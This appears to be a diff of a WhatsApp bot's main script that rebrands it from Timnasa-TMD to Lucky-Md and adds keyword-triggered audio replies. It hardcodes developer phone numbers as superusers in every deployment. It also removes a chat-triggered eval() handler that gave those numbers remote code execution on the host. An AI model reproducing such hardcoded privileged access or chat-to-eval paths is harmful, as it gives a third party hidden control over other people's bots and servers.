@@ -39,12 +39,12 @@ let path = require("path");
 const FileType = require('file-type');
 const { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter');
 //import chalk from 'chalk'
-const { verifierEtatJid , recupererActionJid } = require("./fbase/antilien");
-const { atbverifierEtatJid , atbrecupererActionJid } = require("./fbase/antibot");
+const { verifierEtatJid , recupererActionJid } = require("./bdd/antilien");
+const { atbverifierEtatJid , atbrecupererActionJid } = require("./bdd/antibot");
 let evt = require(__dirname + "/timnasa/timoth");
-const {isUserBanned , addUserToBanList , removeUserFromBanList} = require("./fbase/banUser");
-const  {addGroupToBanList,isGroupBanned,removeGroupFromBanList} = require("./fbase/banGroup");
-const {isGroupOnlyAdmin,addGroupToOnlyAdminList,removeGroupFromOnlyAdminList} = require("./fbase/onlyAdmin");
+const {isUserBanned , addUserToBanList , removeUserFromBanList} = require("./bdd/banUser");
+const  {addGroupToBanList,isGroupBanned,removeGroupFromBanList} = require("./bdd/banGroup");
+const {isGroupOnlyAdmin,addGroupToOnlyAdminList,removeGroupFromOnlyAdminList} = require("./bdd/onlyAdmin");
 //const //{loadCmd}=require("/timnasa/mesfonctions")
 let { reagir } = require(__dirname + "/timnasa/app");
 var session = conf.session.replace(/TIMNASA-TMD;;;=>/g,"");
@@ -83,7 +83,7 @@ authentification();
         const sockOptions = {
             version,
             logger: pino({ level: "silent" }),
-            browser: ['Timnasa-TMd', "safari", "1.0.0"],
+            browser: ['Lucky-Md', "safari", "1.0.0"],
             printQRInTerminal: true,
             fireInitQueries: false,
             shouldSyncHistoryMessage: true,
@@ -134,7 +134,7 @@ function getCurrentDateTime() {
 setInterval(async () => {
     if (conf.AUTO_BIO === "yes") {
         const currentDateTime = getCurrentDateTime(); // Get the current date and time
-        const bioText = `TIMNASA-TMD is running 🚗\n${currentDateTime}`; // Format the bio text
+        const bioText = `Lucky_Md is running 🚗\n${currentDateTime}`; // Format the bio text
         await zk.updateProfileStatus(bioText); // Update the bio
         console.log(`Updated Bio: ${bioText}`); // Log the updated bio
     }
@@ -142,27 +142,15 @@ setInterval(async () => {
 
 // Function to handle deleted messages
 // Other functions (auto-react, anti-delete, etc.) as needed
-        zk.ev.on('call', async (callData) => {
-  if (conf.ANTI_CALL === 'yes') {
+        zk.ev.on("call", async (callData) => {
+  if (conf.ANTICALL === 'yes') {
     const callId = callData[0].id;
     const callerId = callData[0].from;
-    
-    // Reject the call
+
     await zk.rejectCall(callId, callerId);
-
-    // Check if enough time has passed since the last message
-    const currentTime = Date.now();
-    if (currentTime - lastTextTime >= messageDelay) {
-      // Send the rejection message if the delay has passed
-      await client.sendMessage(callerId, {
-        text: conf.ANTI_CALL_TEXT
-      });
-
-      // Update the last text time
-      lastTextTime = currentTime;
-    } else {
-      console.log('Message skipped to prevent overflow');
-    }
+    await zk.sendMessage(callerId, {
+      text: "Hello😊,am Lucky-Md a personal assistant,please try again later"
+    });
   }
 });
 
@@ -708,7 +696,7 @@ if (conf.AUTO_REACT_STATUS === "yes") {
                             text: randomReaction,
                         },
                     }, {
-                        statusJidList: [message.key.participant, timoth],
+                        statusJidList: [message.key.participant, Timoth],
                     });
 
                     lastReactionTime = Date.now();
@@ -790,7 +778,7 @@ async function sendVCard(jid, baseName) {
             document: { url: vCardPath },
             mimetype: 'text/vcard',
             fileName: `${name}.vcf`,
-            caption: `Contact saved as ${name}. Please import this vCard to add the number to your contacts.\n\N TIMNASA TMD👊`
+            caption: `Contact saved as ${name}. Please import this vCard to add the number to your contacts.\n\N LUCKY MD👊`
         });
 
         console.log(`vCard created and sent for: ${name} (${jid})`);
@@ -826,7 +814,7 @@ zk.ev.on("messages.upsert", async (m) => {
         
         // Send additional message to inform the contact of their new saved name
         await zk.sendMessage(origineMessage, {
-            text: `Ssup Your name has been saved as "${assignedName}" in my account.\n\nTIMNASA-TMD`
+            text: `Ssup Your name has been saved as "${assignedName}" in my account.\n\nLUCKY_MD`
         });
 
         console.log(`Contact ${assignedName} has been saved and notified.`);
@@ -837,7 +825,7 @@ zk.ev.on("messages.upsert", async (m) => {
 
 
 // Default auto-reply message
-let auto_reply_message = "Hello,its Timnasa TMd on board. My owner is currently unavailable. Please leave a message, and we will get back to you as soon as possible.";
+let auto_reply_message = "Hello,its Lucky Md on board. My owner is currently unavailable. Please leave a message, and we will get back to you as soon as possible.";
 
 // Track contacts that have already received the auto-reply
 let repliedContacts = new Set();
@@ -877,6 +865,116 @@ zk.ev.on("messages.upsert", async (m) => {
     }
 });
         
+        
+const audioMap = {
+    "hey": "files/hey.wav",
+    "hi": "files/hey.wav",
+    "hey": "files/hey.wav",
+    "he": "files/hey.wav",
+    "hello": "files/hello.wav",
+    "mambo": "files/hey.wav",
+    "niaje": "files/hey.wav",
+    "morning": "files/goodmorning.wav",
+    "goodmorning": "files/goodmorning.wav",
+    "weka up": "files/goodmorning.wav",
+    "night": "files/goodnight.wav",
+    "goodnight": "files/goodnight.wav",
+    "sleep": "files/goodnight.wav",
+    "oyaah": "files/mkuu.wav",
+    "mkuu": "files/mkuu.wav",
+    "mahn": "files/mkuu.wav",
+    "owoh": "files/mkuu.wav",
+    "yoo": "files/mkuu.wav",
+    "wazii": "files/mkuu.wav",
+    "bot": "files/fred.mp3",
+    "lucky": "files/fred.mp3",
+    "lucky md": "files/fred.mp3",
+    "lucky xmd": "files/fred.mp3",
+    "Freddy": "files/fred.mp3",
+    "fred": "files/fred.mp3",
+    "md": "files/fred.mp3",
+    "whatsapp bot": "files/fred.mp3",
+    "bmw md": "files/fred.mp3",
+    "evening": "files/goodevening.wav",
+    "goodevening": "files/goodevening.wav",
+    "darling": "files/darling.wav",
+    "beb": "files/darling.wav",
+    "mpenzi": "files/darling.wav",
+    "afternoon": "files/goodafternoon.wav",
+    "jion": "files/goodafternoon.wav",
+    "kaka": "files/kaka.wav",
+    "bro": "files/morio.mp3",
+    "ndugu": "files/kaka.wav",
+    "morio": "files/morio.mp3",
+    "mzee": "files/morio.mp3",
+    "kijina": "files/mkuu.wav",
+    "mkuu": "files/mkuu.wav",
+     "ozah": "files/mkuu.wav",
+     "ozaah": "files/mkuu.wav",
+    "oyaah": "files/mkuu.wav",
+    "oyah": "files/mkuu.wav",
+
+
+
+
+
+    
+
+};
+
+// Utility to get audio file path for a message
+const getAudioForSentence = (sentence) => {
+    const words = sentence.split(/\s+/); // Split sentence into words
+    for (const word of words) {
+        const audioFile = audioMap[word.toLowerCase()]; // Check each word in sentence
+        if (audioFile) return audioFile; // Return first matched audio file
+    }
+    return null; // Return null if no match
+};
+
+// Auto-reply with audio functionality
+if (conf.AUDIO_REPLY === "yes") {
+    console.log("AUTO_REPLY_AUDIO is enabled. Listening for messages...");
+
+    zk.ev.on("messages.upsert", async (m) => {
+        try {
+            const { messages } = m;
+
+            for (const message of messages) {
+                if (!message.key || !message.key.remoteJid) continue; // Ignore invalid messages
+                
+                const conversationText = message?.message?.conversation || "";
+                const audioFile = getAudioForSentence(conversationText);
+
+                if (audioFile) {
+                    try {
+                        // Check if the audio file exists
+                        await fs.access(audioFile);
+
+                        console.log(`Replying with audio: ${audioFile}`);
+                        await zk.sendMessage(message.key.remoteJid, {
+                            audio: { url: audioFile },
+                            mimetype: "audio/mp4",
+                            ptt: true
+                        });
+
+                        console.log(`Audio reply sent: ${audioFile}`);
+                    } catch (err) {
+                        console.error(`Error sending audio reply: ${err.message}`);
+                    }
+                } else {
+                    console.log("No matching keyword detected. Skipping message.");
+                }
+
+                // Add a delay to prevent spamming
+                await new Promise((resolve) => setTimeout(resolve, 3000));
+            }
+        } catch (err) {
+            console.error("Error in message processing:", err.message);
+        }
+    });
+}
+      
         zk.ev.on("messages.upsert", async (m) => {
             const { messages } = m;
             const ms = messages[0];
@@ -920,12 +1018,12 @@ zk.ev.on("messages.upsert", async (m) => {
             }
             
             var membreGroupe = verifGroupe ? ms.key.participant : '';
-            const { getAllSudoNumbers } = require("./fbase/sudo");
+            const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
             const abu1 = '255752593977';
-            const abu2 = '255756469954';
-            const abu3 = "255784766591";
-            const abu4 = '255784766591';
+            const abu2 = '255752593977';
+            const abu3 = "255752593977";
+            const abu4 = '255752593977';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, abu1, abu2, abu3, abu4, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -971,7 +1069,7 @@ if (etat == 1) {
 const mbre = verifGroupe ? await infosGroupe.participants : '';
 let admins = verifGroupe ? groupeAdmin(mbre) : '';
 const verifAdmin = verifGroupe ? admins.includes(auteurMessage) : false;
-var verifZokouAdmin = verifGroupe ? admins.includes(idBot) : false;
+var verifTimothAdmin = verifGroupe ? admins.includes(idBot) : false;
 
 const arg = texte ? texte.trim().split(/ +/).slice(1) : null;
 const verifCom = texte ? texte.startsWith(prefixe) : false;
@@ -1002,7 +1100,7 @@ var commandeOptions = {
     auteurMessage,
     nomAuteurMessage,
     idBot,
-    verifZokouAdmin,
+    verifTimothAdmin,
     prefixe,
     arg,
     repondre,
@@ -1027,67 +1125,6 @@ if (conf.AUTO_READ === 'yes') {
     });
 }
             
-
-if (! superUser && origineMessage === auteurMessage && conf.AUTO_BLOCK === 'yes') {
-        zk.sendMessage(auteurMessage, {
-          'text': `🚫am blocking you because you have violated ${conf.OWNER_NAME} policies🚫!`
-        });
-        await zk.updateBlockStatus(auteurMessage, 'block');
-      }
-      
-
-      if (texte && texte.startsWith('<')) {
-  if (!superUser) {
-    return repondre(`Only for my ${conf.DEV} or ${conf.OWNER_NAME} to use this command 🚫`);
-  }
-  
-  try { 
-    let evaled = await eval(texte.slice(1)); 
-    if (typeof evaled !== 'string') {
-      evaled = require('util').inspect(evaled); 
-    }
-    await repondre(evaled); 
-  } catch (err) { 
-    await repondre(String(err)); 
-  } 
-      }
-      
-if (texte && texte.startsWith('>')) {
-  // If the sender is not the owner
-  if (!superUser) {
-    const menuText = `This command is only for the owner or Fredie to execute 🚫`;
-
-    await zk.sendMessage(origineMessage, {
-      text: menuText,
-      contextInfo: {
-        externalAdReply: {
-          title: conf.BOT,
-          body: conf.OWNER_NAME,
-          sourceUrl: conf.GURL,
-          thumbnailUrl: conf.URL,
-          mediaType: 1,
-          showAdAttribution: true,
-          renderLargerThumbnail: false
-        }
-      }
-    });
-    return; 
-  }
-
-  try {
-    let evaled = await eval(texte.slice(1));
-
-    // If the evaluated result is not a string, convert it to a string
-    if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
-
-    // Send back the result of the evaluation
-    await repondre(evaled);
-  } catch (err) {
-    // If there's an error, send the error message
-    await repondre(String(err));
-  }
-}
-
 
             /** ****** gestion auto-status  */
             if (ms.key && ms.key.remoteJid === "status@broadcast" && conf.AUTO_READ_STATUS === "yes") {
@@ -1121,7 +1158,7 @@ if (texte && texte.startsWith('>')) {
             
  //---------------------------------------rang-count--------------------------------
              if (texte && auteurMessage.endsWith("s.whatsapp.net")) {
-  const { ajouterOuMettreAJourUserData } = require("./fbase/level"); 
+  const { ajouterOuMettreAJourUserData } = require("./bdd/level"); 
   try {
     await ajouterOuMettreAJourUserData(auteurMessage);
   } catch (e) {
@@ -1141,7 +1178,7 @@ if (texte && texte.startsWith('>')) {
             
                     if(superUser) {console.log('hummm') ; return ;} 
                     
-                    let mbd = require('./fbase/mention') ;
+                    let mbd = require('./bdd/mention') ;
             
                     let alldata = await mbd.recupererToutesLesValeurs() ;
             
@@ -1256,7 +1293,7 @@ if (texte && texte.startsWith('>')) {
                                        await fs.unlink("st1.webp");
 
                                     } else if(action === 'warn') {
-                                        const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./fbase/warn') ;
+                                        const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./bdd/warn') ;
 
                             let warn = await getWarnCountByJID(auteurMessage) ; 
                             let warnlimit = conf.WARN_COUNT
@@ -1291,7 +1328,7 @@ if (texte && texte.startsWith('>')) {
         
     
     catch (e) {
-        console.log("fbase err " + e);
+        console.log("bdd err " + e);
     }
     
 
@@ -1354,7 +1391,7 @@ if (texte && texte.startsWith('>')) {
                await fs.unlink("st1.webp");
 
             } else if(action === 'warn') {
-                const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./fbase/warn') ;
+                const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./bdd/warn') ;
 
     let warn = await getWarnCountByJID(auteurMessage) ; 
     let warnlimit = conf.WARN_COUNT
@@ -1446,7 +1483,7 @@ if (texte && texte.startsWith('>')) {
         //fin événement message
 
 /******** evenement groupe update ****************/
-const { recupevents } = require('./fbase/welcome'); 
+const { recupevents } = require('./bdd/welcome'); 
 
 zk.ev.on('group-participants.update', async (group) => {
     console.log(group);
@@ -1455,7 +1492,7 @@ zk.ev.on('group-participants.update', async (group) => {
     try {
         ppgroup = await zk.profilePictureUrl(group.id, 'image');
     } catch {
-        ppgroup = 'https://files.catbox.moe/snh8mc.jpeg';
+        ppgroup = 'https://files.catbox.moe/7irwqn.jpeg';
     }
 
     try {
@@ -1531,7 +1568,7 @@ zk.ev.on('group-participants.update', async (group) => {
         
     async  function activateCrons() {
         const cron = require('node-cron');
-        const { getCron } = require('./fbase/cron');
+        const { getCron } = require('./bdd/cron');
 
           let crons = await getCron();
           console.log(crons);
@@ -1583,18 +1620,18 @@ zk.ev.on('group-participants.update', async (group) => {
         zk.ev.on("connection.update", async (con) => {
             const { lastDisconnect, connection } = con;
             if (connection === "connecting") {
-                console.log("ℹ️ Timnasa is connecting...");
+                console.log("ℹ️ lucky is connecting...");
             }
             else if (connection === 'open') {
-                console.log("✅ Timnasa Connected to WhatsApp! ☺️");
+                console.log("✅ lucky Connected to WhatsApp! ☺️");
                 console.log("--");
                 await (0, baileys_1.delay)(200);
                 console.log("------");
                 await (0, baileys_1.delay)(300);
                 console.log("------------------/-----");
-                console.log("Timnasa is Online 🕸\n\n");
+                console.log("Lucky is Online 🕸\n\n");
                 //chargement des fez 
-                console.log("Loading Timnasa Commands ...\n");
+                console.log("Loading Lucky Commands ...\n");
                 fs.readdirSync(__dirname + "/fez").forEach((fichier) => {
                     if (path.extname(fichier).toLowerCase() == (".js")) {
                         try {
@@ -1631,15 +1668,15 @@ zk.ev.on('group-participants.update', async (group) => {
 
 ║ Prefix: [ ${prefixe} ]
 ║ Mode: ${md}
-║ Model: TIMNASA-TMD
-║ Bot Name: Timnasa-TMd-Bot 
-║ Owner: Timnasa
+║ Model: Lucky_Md
+║ Bot Name: Lucky-Md-Bot 
+║ Owner: FrediEzra
 ╚═════ ❖ •✦
 -_-<-<-<-<-<-<-<--<-<-<-<-<-<
 
 *🪀Follow my channel for updates and free hacks🙃*
  
-> https://whatsapp.com/channel/0029VajweHxKQuJP6qnjLM31 
+> https://whatsapp.com/channel/0029VaihcQv84Om8LP59fO3f
 
 *Heroku App Configuration*
  
